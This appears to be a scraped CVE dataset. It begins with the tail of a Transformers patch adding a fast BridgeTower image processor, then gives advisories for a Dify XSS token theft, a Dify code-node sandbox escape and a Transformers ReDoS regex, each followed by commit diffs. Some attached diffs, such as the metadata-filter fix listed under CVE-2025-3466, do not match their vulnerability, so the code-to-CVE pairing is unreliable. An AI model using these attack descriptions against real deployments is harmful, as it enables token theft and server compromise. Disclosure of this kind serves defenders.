+        config_and_inputs[0].n_groups //= 2
+        self.model_tester.create_and_check_mamba2_slow_vs_fast_forward(*config_and_inputs)
+
     def test_initialization(self):
         config, _ = self.model_tester.prepare_config_and_inputs_for_common()
 

From 0a83588c5153696879739ba040b4353df7381db4 Mon Sep 17 00:00:00 2001
From: "Vinh H. Pham" <phamvinh257@gmail.com>
Date: Thu, 17 Apr 2025 03:39:18 +0700
Subject: [PATCH 3/4] Bridgetower fast image processor (#37373)

* add support for fast tokenizer

* make style

* fix according to reviews

* make style

* relax slow_fast_equivalence mean diff

---------

Co-authored-by: Yoni Gozlan <74535834+yonigozlan@users.noreply.github.com>
Co-authored-by: yonigozlan <yoni.gozlan@huggingface.co>
---
 docs/source/en/model_doc/bridgetower.md       |   5 +
 docs/source/ja/model_doc/bridgetower.md       |   5 +
 .../models/auto/image_processing_auto.py      |   2 +-
 .../models/bridgetower/__init__.py            |   1 +
 .../image_processing_bridgetower.py           |   8 +-
 .../image_processing_bridgetower_fast.py      | 345 ++++++++++++++++++
 .../test_image_processing_bridgetower.py      | 116 +++---
 tests/test_image_processing_common.py         |   4 +-
 8 files changed, 429 insertions(+), 57 deletions(-)
 create mode 100644 src/transformers/models/bridgetower/image_processing_bridgetower_fast.py

diff --git a/docs/source/en/model_doc/bridgetower.md b/docs/source/en/model_doc/bridgetower.md
index 2aee4cdebe5d..4b8601bf8a95 100644
--- a/docs/source/en/model_doc/bridgetower.md
+++ b/docs/source/en/model_doc/bridgetower.md
@@ -147,6 +147,11 @@ Tips:
 [[autodoc]] BridgeTowerImageProcessor
     - preprocess
 
+## BridgeTowerImageProcessorFast
+
+[[autodoc]] BridgeTowerImageProcessorFast
+    - preprocess
+
 ## BridgeTowerProcessor
 
 [[autodoc]] BridgeTowerProcessor
diff --git a/docs/source/ja/model_doc/bridgetower.md b/docs/source/ja/model_doc/bridgetower.md
index e2ce1cb4c577..c210d4666f36 100644
--- a/docs/source/ja/model_doc/bridgetower.md
+++ b/docs/source/ja/model_doc/bridgetower.md
@@ -144,6 +144,11 @@ BridgeTower は、ビジュアル エンコーダー、テキスト エンコー
 [[autodoc]] BridgeTowerImageProcessor
     - preprocess
 
+## BridgeTowerImageProcessorFast
+
+[[autodoc]] BridgeTowerImageProcessorFast
+    - preprocess
+
 ## BridgeTowerProcessor
 
 [[autodoc]] BridgeTowerProcessor
diff --git a/src/transformers/models/auto/image_processing_auto.py b/src/transformers/models/auto/image_processing_auto.py
index 082a78199642..296c3dad10d5 100644
--- a/src/transformers/models/auto/image_processing_auto.py
+++ b/src/transformers/models/auto/image_processing_auto.py
@@ -62,7 +62,7 @@
             ("bit", ("BitImageProcessor", "BitImageProcessorFast")),
             ("blip", ("BlipImageProcessor", "BlipImageProcessorFast")),
             ("blip-2", ("BlipImageProcessor", "BlipImageProcessorFast")),
-            ("bridgetower", ("BridgeTowerImageProcessor",)),
+            ("bridgetower", ("BridgeTowerImageProcessor", "BridgeTowerImageProcessorFast")),
             ("chameleon", ("ChameleonImageProcessor",)),
             ("chinese_clip", ("ChineseCLIPImageProcessor", "ChineseCLIPImageProcessorFast")),
             ("clip", ("CLIPImageProcessor", "CLIPImageProcessorFast")),
diff --git a/src/transformers/models/bridgetower/__init__.py b/src/transformers/models/bridgetower/__init__.py
index 65613444624f..8ca84a320fdc 100644
--- a/src/transformers/models/bridgetower/__init__.py
+++ b/src/transformers/models/bridgetower/__init__.py
@@ -20,6 +20,7 @@
 if TYPE_CHECKING:
     from .configuration_bridgetower import *
     from .image_processing_bridgetower import *
+    from .image_processing_bridgetower_fast import *
     from .modeling_bridgetower import *
     from .processing_bridgetower import *
 else:
diff --git a/src/transformers/models/bridgetower/image_processing_bridgetower.py b/src/transformers/models/bridgetower/image_processing_bridgetower.py
index 517f9b2e4f31..95eaa9f88b92 100644
--- a/src/transformers/models/bridgetower/image_processing_bridgetower.py
+++ b/src/transformers/models/bridgetower/image_processing_bridgetower.py
@@ -28,8 +28,8 @@
     PILImageResampling,
     get_image_size,
     infer_channel_dimension_format,
-    is_batched,
     is_scaled_image,
+    make_flat_list_of_images,
     to_numpy_array,
     valid_images,
     validate_preprocess_arguments,
@@ -455,7 +455,7 @@ def preprocess(
         image_mean = image_mean if image_mean is not None else self.image_mean
         image_std = image_std if image_std is not None else self.image_std
         do_pad = do_pad if do_pad is not None else self.do_pad
-        do_center_crop if do_center_crop is not None else self.do_center_crop
+        do_center_crop = do_center_crop if do_center_crop is not None else self.do_center_crop
         # For backwards compatibility. Initial version of this processor was cropping to the "size" argument, which
         # it should default to if crop_size is undefined.
         crop_size = (
@@ -464,9 +464,7 @@ def preprocess(
 
         size = size if size is not None else self.size
         size = get_size_dict(size, default_to_square=False)
-
-        if not is_batched(images):
-            images = [images]
+        images = make_flat_list_of_images(images)
 
         if not valid_images(images):
             raise ValueError(
diff --git a/src/transformers/models/bridgetower/image_processing_bridgetower_fast.py b/src/transformers/models/bridgetower/image_processing_bridgetower_fast.py
new file mode 100644
index 000000000000..7af3213854fd
--- /dev/null
+++ b/src/transformers/models/bridgetower/image_processing_bridgetower_fast.py
@@ -0,0 +1,345 @@
+# coding=utf-8
+# Copyright 2025 The Intel Labs Team Authors, The Microsoft Research Team Authors and HuggingFace Inc. team. All rights reserved.
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+"""Fast Image processor class for BridgeTower."""
+
+from typing import Dict, Iterable, Optional, Tuple, Union
+
+from ...image_processing_utils_fast import (
+    BASE_IMAGE_PROCESSOR_FAST_DOCSTRING,
+    BASE_IMAGE_PROCESSOR_FAST_DOCSTRING_PREPROCESS,
+    BaseImageProcessorFast,
+    BatchFeature,
+    DefaultFastImageProcessorKwargs,
+    ImageInput,
+    SizeDict,
+    TensorType,
+    Unpack,
+    get_max_height_width,
+    group_images_by_shape,
+    reorder_images,
+)
+from ...image_utils import OPENAI_CLIP_MEAN, OPENAI_CLIP_STD, PILImageResampling
+from ...utils import add_start_docstrings, is_torch_available, is_torchvision_available, is_torchvision_v2_available
+
+
+if is_torch_available():
+    import torch
+
+if is_torchvision_available():
+    if is_torchvision_v2_available():
+        from torchvision.transforms.v2 import functional as F
+    else:
+        from torchvision.transforms import functional as F
+
+
+def make_pixel_mask(
+    image: "torch.Tensor",
+    output_size: Tuple[int, int],
+) -> "torch.Tensor":
+    """
+    Make a pixel mask for the image, where 1 indicates a valid pixel and 0 indicates padding.
+
+    Args:
+        image (`np.ndarray`):
+            Image to make the pixel mask for.
+        output_size (`Tuple[int, int]`):
+            Output size of the mask.
+    """
+    input_height, input_width = image.shape[-2:]
+    batch_size = image.size(0)
+    mask = torch.zeros((batch_size, *output_size), dtype=torch.long)
+    mask[:input_height, :input_width] = 1
+    return mask
+
+
+def get_resize_output_image_size(
+    input_image: "torch.Tensor",
+    shorter: int = 800,
+    longer: int = 1333,
+    size_divisor: int = 32,
+) -> Tuple[int, int]:
+    input_height, input_width = input_image.shape[-2:]
+    min_size, max_size = shorter, longer
+
+    scale = min_size / min(input_height, input_width)
+
+    if input_height < input_width:
+        new_height = min_size
+        new_width = scale * input_width
+    else:
+        new_height = scale * input_height
+        new_width = min_size
+
+    if max(new_height, new_width) > max_size:
+        scale = max_size / max(new_height, new_width)
+        new_height = scale * new_height
+        new_width = scale * new_width
+
+    new_height, new_width = int(new_height + 0.5), int(new_width + 0.5)
+    new_height = new_height // size_divisor * size_divisor
+    new_width = new_width // size_divisor * size_divisor
+
+    return new_height, new_width
+
+
+class BridgeTowerFastImageProcessorKwargs(DefaultFastImageProcessorKwargs):
+    size_divisor: Optional[int]
+    do_pad: Optional[bool]
+
+
+@add_start_docstrings(
+    "Constructs a fast BridgeTower image processor.",
+    BASE_IMAGE_PROCESSOR_FAST_DOCSTRING,
+    """
+        size_divisor (`int`, *optional*, defaults to 32):
+            The size by which to make sure both the height and width can be divided. Only has an effect if `do_resize`
+            is set to `True`. Can be overridden by the `size_divisor` parameter in the `preprocess` method.
+        do_pad (`bool`, *optional*, defaults to `True`):
+            Whether to pad the image to the `(max_height, max_width)` of the images in the batch. Can be overridden by
+            the `do_pad` parameter in the `preprocess` method.
+    """,
+)
+class BridgeTowerImageProcessorFast(BaseImageProcessorFast):
+    resample = PILImageResampling.BICUBIC
+    image_mean = OPENAI_CLIP_MEAN
+    image_std = OPENAI_CLIP_STD
+    size = {"shortest_edge": 288}
+    default_to_square = False
+    crop_size = {"shortest_edge": 288}
+    do_resize = True
+    do_center_crop = True
+    do_rescale = True
+    do_normalize = True
+    do_pad = True
+    size_divisor = 32
+    valid_kwargs = BridgeTowerFastImageProcessorKwargs
+
+    def __init__(self, **kwargs: Unpack[BridgeTowerFastImageProcessorKwargs]):
+        super().__init__(**kwargs)
+
+    @add_start_docstrings(
+        BASE_IMAGE_PROCESSOR_FAST_DOCSTRING_PREPROCESS,
+        """
+            size_divisor (`int`, *optional*, defaults to 32):
+                The size by which to make sure both the height and width can be divided. Only has an effect if `do_resize`
+                is set to `True`. Can be overridden by the `size_divisor` parameter in the `preprocess` method.
+            do_pad (`bool`, *optional*, defaults to `True`):
+                Whether to pad the image to the `(max_height, max_width)` of the images in the batch. Can be overridden by
+                the `do_pad` parameter in the `preprocess` method.
+        """,
+    )
+    def preprocess(self, images: ImageInput, **kwargs: Unpack[BridgeTowerFastImageProcessorKwargs]) -> BatchFeature:
+        return super().preprocess(images, **kwargs)
+
+    def resize(
+        self,
+        image: "torch.Tensor",
+        size: SizeDict,
+        size_divisor: int = 32,
+        interpolation: "F.InterpolationMode" = None,
+        antialias: bool = True,
+        **kwargs,
+    ) -> "torch.Tensor":
+        """
+        Resize an image.
+
+        Resizes the shorter side of the image to `size["shortest_edge"]` while preserving the aspect ratio. If the
+        longer side is larger than the max size `(int(`size["shortest_edge"]` * 1333 / 800))`, the longer side is then
+        resized to the max size while preserving the aspect ratio.
+
+        Args:
+            image (`torch.Tensor`):
+                Image to resize.
+            size (`SizeDict`):
+                Dictionary in the format `{"height": int, "width": int}` specifying the size of the output image.
+            size_divisor (`int`, *optional*, defaults to 32):
+                The image is resized to a size that is a multiple of this value.
+            resample (`InterpolationMode`, *optional*, defaults to `InterpolationMode.BILINEAR`):
+                `InterpolationMode` filter to use when resizing the image e.g. `InterpolationMode.BICUBIC`.
+
+        Returns:
+            `torch.Tensor`: The resized image.
+        """
+        interpolation = interpolation if interpolation is not None else F.InterpolationMode.BILINEAR
+        if not size.shortest_edge:
+            raise ValueError(f"The `size` dictionary must contain the key `shortest_edge`. Got {size.keys()}")
+        shorter = size.shortest_edge
+        longer = int(1333 / 800 * shorter)
+        output_size = get_resize_output_image_size(
+            image,
+            shorter=shorter,
+            longer=longer,
+            size_divisor=size_divisor,
+        )
+        return F.resize(image, output_size, interpolation=interpolation, antialias=antialias)
+
+    def center_crop(
+        self,
+        image: "torch.Tensor",
+        size: Dict[str, int],
+        **kwargs,
+    ) -> "torch.Tensor":
+        """
+        Center crop an image to `(size["height"], size["width"])`. If the input size is smaller than `crop_size` along
+        any edge, the image is padded with 0's and then center cropped.
+
+        Args:
+            image (`torch.Tensor`):
+                Image to center crop.
+            size (`Dict[str, int]`):
+                Size of the output image in the form `{"height": h, "width": w}`.
+        """
+        output_size = size.shortest_edge
+        return F.center_crop(
+            image,
+            output_size=(output_size, output_size),
+            **kwargs,
+        )
+
+    def _pad_image(
+        self,
+        image: "torch.Tensor",
+        output_size: Tuple[int, int],
+        constant_values: Union[float, Iterable[float]] = 0,
+    ) -> "torch.Tensor":
+        """
+        Pad an image with zeros to the given size.
+        """
+        input_height, input_width = image.shape[-2:]
+        output_height, output_width = output_size
+
+        pad_bottom = output_height - input_height
+        pad_right = output_width - input_width
+        padding = (0, 0, pad_right, pad_bottom)
+        padded_image = F.pad(
+            image,
+            padding,
+            fill=constant_values,
+        )
+        return padded_image
+
+    def pad(
+        self,
+        images: list["torch.Tensor"],
+        constant_values: Union[float, Iterable[float]] = 0,
+        return_pixel_mask: bool = True,
+    ) -> tuple:
+        """
+        Pads a batch of images to the bottom and right of the image with zeros to the size of largest height and width
+        in the batch and optionally returns their corresponding pixel mask.
+
+        Args:
+            image (`torch.Tensor`):
+                Image to pad.
+            constant_values (`float` or `Iterable[float]`, *optional*):
+                The value to use for the padding if `mode` is `"constant"`.
+            return_pixel_mask (`bool`, *optional*, defaults to `True`):
+                Whether to return a pixel mask.
+            return_tensors (`str` or `TensorType`, *optional*):
+                The type of tensors to return. Can be one of:
+                    - Unset: Return a list of `np.ndarray`.
+                    - `TensorType.TENSORFLOW` or `'tf'`: Return a batch of type `tf.Tensor`.
+                    - `TensorType.PYTORCH` or `'pt'`: Return a batch of type `torch.Tensor`.
+                    - `TensorType.NUMPY` or `'np'`: Return a batch of type `np.ndarray`.
+                    - `TensorType.JAX` or `'jax'`: Return a batch of type `jax.numpy.ndarray`.
+        """
+        pad_size = get_max_height_width(images)
+
+        grouped_images, grouped_images_index = group_images_by_shape(images)
+        processed_images_grouped = {}
+        processed_masks_grouped = {}
+        for shape, stacked_images in grouped_images.items():
+            stacked_images = self._pad_image(
+                stacked_images,
+                pad_size,
+                constant_values=constant_values,
+            )
+            processed_images_grouped[shape] = stacked_images
+
+            if return_pixel_mask:
+                stacked_masks = make_pixel_mask(image=stacked_images, output_size=pad_size)
+                processed_masks_grouped[shape] = stacked_masks
+
+        processed_images = reorder_images(processed_images_grouped, grouped_images_index)
+
+        processed_masks = None
+        if return_pixel_mask:
+            processed_masks = reorder_images(processed_masks_grouped, grouped_images_index)
+
+        return processed_images, processed_masks
+
+    def _preprocess(
+        self,
+        images: list["torch.Tensor"],
+        do_resize: bool,
+        size: SizeDict,
+        size_divisor: Optional[int],
+        interpolation: Optional["F.InterpolationMode"],
+        do_pad: bool,
+        do_center_crop: bool,
+        crop_size: SizeDict,
+        do_rescale: bool,
+        rescale_factor: float,
+        do_normalize: bool,
+        image_mean: Optional[Union[float, list[float]]],
+        image_std: Optional[Union[float, list[float]]],
+        return_tensors: Optional[Union[str, TensorType]],
+        **kwargs,
+    ) -> BatchFeature:
+        # Group images by size for batched resizing
+        grouped_images, grouped_images_index = group_images_by_shape(images)
+        resized_images_grouped = {}
+        for shape, stacked_images in grouped_images.items():
+            if do_resize:
+                stacked_images = self.resize(
+                    image=stacked_images, size=size, size_divisor=size_divisor, interpolation=interpolation
+                )
+            resized_images_grouped[shape] = stacked_images
+        resized_images = reorder_images(resized_images_grouped, grouped_images_index)
+
+        # Group images by size for further processing
+        # Needed in case do_resize is False, or resize returns images with different sizes
+        grouped_images, grouped_images_index = group_images_by_shape(resized_images)
+        processed_images_grouped = {}
+        for shape, stacked_images in grouped_images.items():
+            if do_center_crop:
+                stacked_images = self.center_crop(stacked_images, crop_size)
+            # Fused rescale and normalize
+            stacked_images = self.rescale_and_normalize(
+                stacked_images, do_rescale, rescale_factor, do_normalize, image_mean, image_std
+            )
+            processed_images_grouped[shape] = stacked_images
+
+        processed_images = reorder_images(processed_images_grouped, grouped_images_index)
+
+        data = {}
+        if do_pad:
+            processed_images, processed_masks = self.pad(processed_images, return_pixel_mask=True)
+            processed_masks = torch.stack(processed_masks, dim=0) if return_tensors else processed_masks
+            data["pixel_mask"] = processed_masks
+
+        processed_images = torch.stack(processed_images, dim=0) if return_tensors else processed_images
+        data["pixel_values"] = processed_images
+
+        return BatchFeature(data=data, tensor_type=return_tensors)
+
+    def to_dict(self):
+        encoder_dict = super().to_dict()
+        encoder_dict.pop("_valid_processor_keys", None)
+        encoder_dict.pop("crop_size", None)
+        return encoder_dict
+
+
+__all__ = ["BridgeTowerImageProcessorFast"]
diff --git a/tests/models/bridgetower/test_image_processing_bridgetower.py b/tests/models/bridgetower/test_image_processing_bridgetower.py
index b03896951352..388bb65f69dc 100644
--- a/tests/models/bridgetower/test_image_processing_bridgetower.py
+++ b/tests/models/bridgetower/test_image_processing_bridgetower.py
@@ -16,19 +16,25 @@
 import unittest
 from typing import Optional, Union
 
-import numpy as np
+import requests
 
 from transformers.testing_utils import require_torch, require_vision
-from transformers.utils import is_vision_available
+from transformers.utils import is_torch_available, is_torchvision_available, is_vision_available
 
 from ...test_image_processing_common import ImageProcessingTestMixin, prepare_image_inputs
 
 
+if is_torch_available():
+    import torch
+
 if is_vision_available():
     from PIL import Image
 
     from transformers import BridgeTowerImageProcessor
 
+    if is_torchvision_available():
+        from transformers import BridgeTowerImageProcessorFast
+
 
 class BridgeTowerImageProcessingTester:
     def __init__(
@@ -76,46 +82,7 @@ def prepare_image_processor_dict(self):
         }
 
     def get_expected_values(self, image_inputs, batched=False):
-        """
-        This function computes the expected height and widt
... [truncated]

================================================================================


CVE ID: CVE-2025-3467
Published: 2025-07-07T10:15:27.793
Modified: 2025-07-10T13:34:32.803
CVSS Score: 5.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
An XSS vulnerability exists in langgenius/dify versions prior to 1.1.3, specifically affecting Firefox browsers. This vulnerability allows an attacker to obtain the administrator's token by sending a payload in the published chat. When the administrator views the conversation content through the monitoring/log function using Firefox, the XSS vulnerability is triggered, potentially exposing sensitive token information to the attacker.

References (2):
  1. https://github.com/langgenius/dify/commit/72deb3bed0b0d5d98d7cf44b525cc44bb278f6a7 [Patch]
  2. https://huntr.com/bounties/21723441-7b55-425c-abc4-b1331a713591 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/langgenius/dify/commit/72deb3bed0b0d5d98d7cf44b525cc44bb278f6a7 ---
From 72deb3bed0b0d5d98d7cf44b525cc44bb278f6a7 Mon Sep 17 00:00:00 2001
From: Joel <iamjoel007@gmail.com>
Date: Mon, 24 Mar 2025 14:36:07 +0800
Subject: [PATCH] fix: sanitizer svg to avoid xss (#16606)

---
 web/app/components/base/markdown.tsx          | 26 +++++++------------
 web/app/components/base/svg-gallery/index.tsx |  3 ++-
 web/package.json                              |  5 ++--
 web/pnpm-lock.yaml                            | 11 +++++---
 4 files changed, 21 insertions(+), 24 deletions(-)

diff --git a/web/app/components/base/markdown.tsx b/web/app/components/base/markdown.tsx
index 72e7961cad0b27..3b846c0e2f80b9 100644
--- a/web/app/components/base/markdown.tsx
+++ b/web/app/components/base/markdown.tsx
@@ -27,6 +27,7 @@ import ThinkBlock from '@/app/components/base/markdown-blocks/think-block'
 import { Theme } from '@/types/app'
 import useTheme from '@/hooks/use-theme'
 import cn from '@/utils/classnames'
+import SVGRenderer from './svg-gallery'
 
 // Available language https://github.com/react-syntax-highlighter/react-syntax-highlighter/blob/master/AVAILABLE_LANGUAGES_HLJS.MD
 const capitalizationLanguageNameMap: Record<string, string> = {
@@ -136,14 +137,13 @@ const CodeBlock: any = memo(({ inline, className, children, ...props }: any) =>
         </div>
       )
     }
-    // Attention: SVGRenderer has xss vulnerability
-    // else if (language === 'svg' && isSVG) {
-    //   return (
-    //     <ErrorBoundary>
-    //       <SVGRenderer content={content} />
-    //     </ErrorBoundary>
-    //   )
-    // }
+    else if (language === 'svg' && isSVG) {
+      return (
+        <ErrorBoundary>
+          <SVGRenderer content={content} />
+        </ErrorBoundary>
+      )
+    }
     else {
       return (
         <SyntaxHighlighter
@@ -240,19 +240,11 @@ const Link = ({ node, ...props }: any) => {
   }
 }
 
-function escapeSVGTags(htmlString: string): string {
-  return htmlString.replace(/(<svg[\s\S]*?>)([\s\S]*?)(<\/svg>)/gi, (match: string, openTag: string, innerContent: string, closeTag: string): string => {
-    return openTag.replace(/</g, '&lt;').replace(/>/g, '&gt;')
-      + innerContent.replace(/</g, '&lt;').replace(/>/g, '&gt;')
-      + closeTag.replace(/</g, '&lt;').replace(/>/g, '&gt;')
-  })
-}
-
 export function Markdown(props: { content: string; className?: string; customDisallowedElements?: string[] }) {
   const latexContent = flow([
     preprocessThinkTag,
     preprocessLaTeX,
-  ])(escapeSVGTags(props.content))
+  ])(props.content)
 
   return (
     <div className={cn('markdown-body', '!text-text-primary', props.className)}>
diff --git a/web/app/components/base/svg-gallery/index.tsx b/web/app/components/base/svg-gallery/index.tsx
index 8b7bb03920fa30..5fe8d7946a9f85 100644
--- a/web/app/components/base/svg-gallery/index.tsx
+++ b/web/app/components/base/svg-gallery/index.tsx
@@ -1,6 +1,7 @@
 import { useEffect, useRef, useState } from 'react'
 import { SVG } from '@svgdotjs/svg.js'
 import ImagePreview from '@/app/components/base/image-uploader/image-preview'
+import DOMPurify from 'dompurify'
 
 export const SVGRenderer = ({ content }: { content: string }) => {
   const svgRef = useRef<HTMLDivElement>(null)
@@ -44,7 +45,7 @@ export const SVGRenderer = ({ content }: { content: string }) => {
 
         svgRef.current.style.width = `${Math.min(originalWidth, 298)}px`
 
-        const rootElement = draw.svg(content)
+        const rootElement = draw.svg(DOMPurify.sanitize(content))
 
         rootElement.click(() => {
           setImagePreview(svgToDataURL(svgElement as Element))
diff --git a/web/package.json b/web/package.json
index 1a0b8119f3cd9a..47cf4f56fc9c4d 100644
--- a/web/package.json
+++ b/web/package.json
@@ -61,6 +61,7 @@
     "crypto-js": "^4.2.0",
     "dayjs": "^1.11.13",
     "decimal.js": "^10.4.3",
+    "dompurify": "^3.2.4",
     "echarts": "^5.5.1",
     "echarts-for-react": "^3.0.2",
     "elkjs": "^0.9.3",
@@ -132,10 +133,10 @@
   },
   "devDependencies": {
     "@antfu/eslint-config": "^4.1.1",
-    "@eslint/js": "^9.20.0",
     "@chromatic-com/storybook": "^3.1.0",
     "@eslint-react/eslint-plugin": "^1.15.0",
     "@eslint/eslintrc": "^3.1.0",
+    "@eslint/js": "^9.20.0",
     "@faker-js/faker": "^9.0.3",
     "@next/eslint-plugin-next": "^15.2.3",
     "@rgrove/parse-xml": "^4.1.0",
@@ -174,11 +175,11 @@
     "code-inspector-plugin": "^0.18.1",
     "cross-env": "^7.0.3",
     "eslint": "^9.20.1",
+    "eslint-config-next": "^15.0.0",
     "eslint-plugin-react-hooks": "^5.1.0",
     "eslint-plugin-react-refresh": "^0.4.19",
     "eslint-plugin-storybook": "^0.11.2",
     "eslint-plugin-tailwindcss": "^3.18.0",
-    "eslint-config-next": "^15.0.0",
     "husky": "^9.1.6",
     "jest": "^29.7.0",
     "jest-environment-jsdom": "^29.7.0",
diff --git a/web/pnpm-lock.yaml b/web/pnpm-lock.yaml
index eb31f688d8ceef..a25cd4e6d29562 100644
--- a/web/pnpm-lock.yaml
+++ b/web/pnpm-lock.yaml
@@ -121,6 +121,9 @@ importers:
       decimal.js:
         specifier: ^10.4.3
         version: 10.4.3
+      dompurify:
+        specifier: ^3.2.4
+        version: 3.2.4
       echarts:
         specifier: ^5.5.1
         version: 5.5.1
@@ -4299,8 +4302,8 @@ packages:
     resolution: {integrity: sha512-GrwoxYN+uWlzO8uhUXRl0P+kHE4GtVPfYzVLcUxPL7KNdHKj66vvlhiweIHqYYXWlw+T8iLMp42Lm67ghw4WMQ==}
     engines: {node: '>= 4'}
 
-  dompurify@3.2.3:
-    resolution: {integrity: sha512-U1U5Hzc2MO0oW3DF+G9qYN0aT7atAou4AgI0XjWz061nyBPbdxkfdhfy5uMgGn6+oLFCfn44ZGbdDqCzVmlOWA==}
+  dompurify@3.2.4:
+    resolution: {integrity: sha512-ysFSFEDVduQpyhzAob/kkuJjf5zWkZD8/A9ywSp1byueyuCfHamrCBa14/Oc2iiB0e51B+NpxSl5gmzn+Ms/mg==}
 
   domutils@2.8.0:
     resolution: {integrity: sha512-w96Cjofp72M5IIhpjgobBimYEfoPjx1Vx0BSX9P30WBdZW2WIKU0T1Bd0kz2eNZ9ikjKgHbEyKx8BB6H1L3h3A==}
@@ -13070,7 +13073,7 @@ snapshots:
     dependencies:
       domelementtype: 2.3.0
 
-  dompurify@3.2.3:
+  dompurify@3.2.4:
     optionalDependencies:
       '@types/trusted-types': 2.0.7
 
@@ -15688,7 +15691,7 @@ snapshots:
       d3-sankey: 0.12.3
       dagre-d3-es: 7.0.11
       dayjs: 1.11.13
-      dompurify: 3.2.3
+      dompurify: 3.2.4
       katex: 0.16.21
       khroma: 2.1.0
       lodash-es: 4.17.21


================================================================================


CVE ID: CVE-2025-3466
Published: 2025-07-07T10:15:27.640
Modified: 2025-07-10T15:01:31.070
CVSS Score: 7.2 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-1100: CWE-1100

Description:
langgenius/dify versions 1.1.0 to 1.1.2 are vulnerable to unsanitized input in the code node, allowing execution of arbitrary code with full root permissions. The vulnerability arises from the ability to override global functions in JavaScript, such as parseInt, before sandbox security restrictions are imposed. This can lead to unauthorized access to secret keys, internal network servers, and lateral movement within dify.ai. The issue is resolved in version 1.1.3.

References (2):
  1. https://github.com/langgenius/dify/commit/1be0d26c1feb4bcbbdd2b4ae4eeb25874aadaddb [Patch]
  2. https://huntr.com/bounties/f8dc17a3-5536-4944-a680-24070903cd2d [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/langgenius/dify/commit/1be0d26c1feb4bcbbdd2b4ae4eeb25874aadaddb ---
From 1be0d26c1feb4bcbbdd2b4ae4eeb25874aadaddb Mon Sep 17 00:00:00 2001
From: Jyong <76649700+JohnJyong@users.noreply.github.com>
Date: Mon, 24 Mar 2025 18:35:16 +0800
Subject: [PATCH] fix metadata filter not affect in keyword-search and
 fulltext-search (#16644)

---
 api/core/rag/datasource/retrieval_service.py | 6 +++++-
 api/core/rag/retrieval/dataset_retrieval.py  | 6 +++++-
 2 files changed, 10 insertions(+), 2 deletions(-)

diff --git a/api/core/rag/datasource/retrieval_service.py b/api/core/rag/datasource/retrieval_service.py
index c0c0d21a2bf6fc..fea4d0edf7ba92 100644
--- a/api/core/rag/datasource/retrieval_service.py
+++ b/api/core/rag/datasource/retrieval_service.py
@@ -97,6 +97,7 @@ def retrieve(
                         all_documents=all_documents,
                         retrieval_method=retrieval_method,
                         exceptions=exceptions,
+                        document_ids_filter=document_ids_filter,
                     )
                 )
             concurrent.futures.wait(futures, timeout=30, return_when=concurrent.futures.ALL_COMPLETED)
@@ -222,6 +223,7 @@ def full_text_index_search(
         all_documents: list,
         retrieval_method: str,
         exceptions: list,
+        document_ids_filter: Optional[list[str]] = None,
     ):
         with flask_app.app_context():
             try:
@@ -231,7 +233,9 @@ def full_text_index_search(
 
                 vector_processor = Vector(dataset=dataset)
 
-                documents = vector_processor.search_by_full_text(cls.escape_query_for_search(query), top_k=top_k)
+                documents = vector_processor.search_by_full_text(
+                    cls.escape_query_for_search(query), top_k=top_k, document_ids_filter=document_ids_filter
+                )
                 if documents:
                     if (
                         reranking_model
diff --git a/api/core/rag/retrieval/dataset_retrieval.py b/api/core/rag/retrieval/dataset_retrieval.py
index f56b2db8a6c453..2fe46197f78bcb 100644
--- a/api/core/rag/retrieval/dataset_retrieval.py
+++ b/api/core/rag/retrieval/dataset_retrieval.py
@@ -610,7 +610,11 @@ def _retriever(
                 if dataset.indexing_technique == "economy":
                     # use keyword table query
                     documents = RetrievalService.retrieve(
-                        retrieval_method="keyword_search", dataset_id=dataset.id, query=query, top_k=top_k
+                        retrieval_method="keyword_search",
+                        dataset_id=dataset.id,
+                        query=query,
+                        top_k=top_k,
+                        document_ids_filter=document_ids_filter,
                     )
                     if documents:
                         all_documents.extend(documents)


================================================================================


CVE ID: CVE-2025-3264
Published: 2025-07-07T10:15:27.500
Modified: 2025-08-07T01:02:30.700
CVSS Score: 5.3 (MEDIUM) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-1333: CWE-1333

Description:
A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically in the `get_imports()` function within `dynamic_module_utils.py`. This vulnerability affects versions 4.49.0 and is fixed in version 4.51.0. The issue arises from a regular expression pattern `\s*try\s*:.*?except.*?:` used to filter out try/except blocks from Python code, which can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. This vulnerability can lead to remote code loading disruption, resource exhaustion in model serving, supply chain attack vectors, and development pipeline disruption.

References (2):
  1. https://github.com/huggingface/transformers/commit/0720e206c6ba28887e4d60ef60a6a089f6c1cc76 [Patch]
  2. https://huntr.com/bounties/3c6f7822-9992-476d-8cf0-b0b1623427df [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/huggingface/transformers/commit/0720e206c6ba28887e4d60ef60a6a089f6c1cc76 ---
From 0720e206c6ba28887e4d60ef60a6a089f6c1cc76 Mon Sep 17 00:00:00 2001
From: Lysandre <hi@lysand.re>
Date: Sat, 5 Apr 2025 22:03:17 +0200
Subject: [PATCH] Release: v4.51.0

---
 examples/flax/question-answering/run_qa.py    |    2 +-
 .../run_flax_speech_recognition_seq2seq.py    |    2 +-
 .../flax/text-classification/run_flax_glue.py |    2 +-
 .../flax/token-classification/run_flax_ner.py |    2 +-
 .../run_audio_classification.py               |    2 +-
 .../contrastive-image-text/run_clip.py        |    2 +-
 .../run_image_classification.py               |    2 +-
 .../run_image_classification_no_trainer.py    |    2 +-
 examples/pytorch/image-pretraining/run_mae.py |    2 +-
 examples/pytorch/image-pretraining/run_mim.py |    2 +-
